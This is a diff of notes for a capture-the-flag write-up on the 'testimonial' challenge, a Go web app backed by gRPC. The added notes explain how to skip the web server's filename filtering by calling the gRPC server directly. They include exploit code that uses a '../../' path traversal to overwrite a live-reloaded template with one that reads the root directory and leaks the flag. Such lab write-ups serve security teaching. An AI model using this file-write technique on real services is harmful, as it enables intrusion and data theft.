@@ -6,32 +6,54 @@ As the leader of the Revivalists you are determined to take down the KORP, you a
 
 ```sh
 docker run -d -p 1337:1337 -p 50045:50045 testimonial
-
-
 ```
 
-GET http://localhost:1337/?testimonial=test&customer=barrett
+https://youtu.be/EGItzKCxTdQ?si=Ju6odrgwEQsWz1We&t=568
+
+go app, grpc
+
+all validation is happening on web server, so you can actually make a grpc client to interact directly with the grpc server!
+
+`.air.toml` is used to live reload service - https://github.com/cosmtrek/air (live reload for Go apps)
+
+everytime a testimonial is submitted, the `index.templ` is going to read all templates from disk.
+
+grpc client code was copied out and validation was removed, exploit template was created
 
 ```go
-// interesting...
+// exploit.templ
+// this is just index.templ with overrided GetTestimonials function
 
-func (c *Client) SendTestimonial(customer, testimonial string) error {
-	ctx := context.Background()
-	// Filter bad characters.
-	for _, char := range []string{"/", "\\", ":", "*", "?", "\"", "<", ">", "|", "."} {
-		customer = strings.ReplaceAll(customer, char, "")
+//...
+
+// override GetTestimonials() to read root directory
+
+func GetTestimonials() []string {
+	fsys := os.DirFS("/")
+	files, err := fs.ReadDir(fsys, ".")
+	if err != nil {
+		return []string{fmt.Sprintf("Error reading testimonials: %v", err)}
 	}
-
-	_, err := c.SubmitTestimonial(ctx, &pb.TestimonialSubmission{Customer: customer, Testimonial: testimonial})
-	return err
+	var res []string
+	for _, file := range files {
+		fileContent, _ := fs.ReadFile(fsys, file.Name())
+		res = append(res, string(fileContent))
+	}
+	return res
 }
 ```
 
-```
-client.go Sendtestimonial()
-grpc.go SubmitTestimonial()
+```go
+// snippet of copied out grpc client
 
-there has to be a way to write arbitrary files...
+// ...
+
+func main() {
+	c, _ := GetClient()
+	exploit, _ := ioutil.ReadFile("./exploit.templ")
+	c.SendTestimonial("../../view/home/index.templ", string(exploit))
+	// c.SendTestimonial("../../main.go", string(exploit))
+}
 ```
 
-TODO:
+bypasses web server and hits grpc handler directly to leak flag
